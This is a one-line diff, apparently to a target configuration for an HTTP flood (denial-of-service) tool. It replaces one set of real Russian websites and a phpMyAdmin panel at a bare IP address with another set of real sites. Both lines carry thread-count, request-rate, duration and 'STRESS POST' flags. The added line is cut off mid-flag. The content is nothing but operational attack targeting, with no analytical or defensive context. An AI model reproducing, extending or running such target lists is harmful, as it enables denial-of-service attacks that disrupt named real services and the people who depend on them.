@@ -1,1 +1,1 @@
-https://flowlu.ru https://my.flowlu.ru/register https://flowlu.ru/services/tasks/ https://flowlu.ru/prices/ https://flowlu.ru/blog/ http://178.170.244.102/phpmyadmin/ -t 2000 --rpc 1500 -p 900 --http-methods STRESS POST --table
+https://1cl.su/ https://1clancer.ru/ https://lancer.forum-1c.ru/ https://forum-1c.ru/ -t 2100 --rpc 2000 -p 900 --http-methods STRESS POST --t
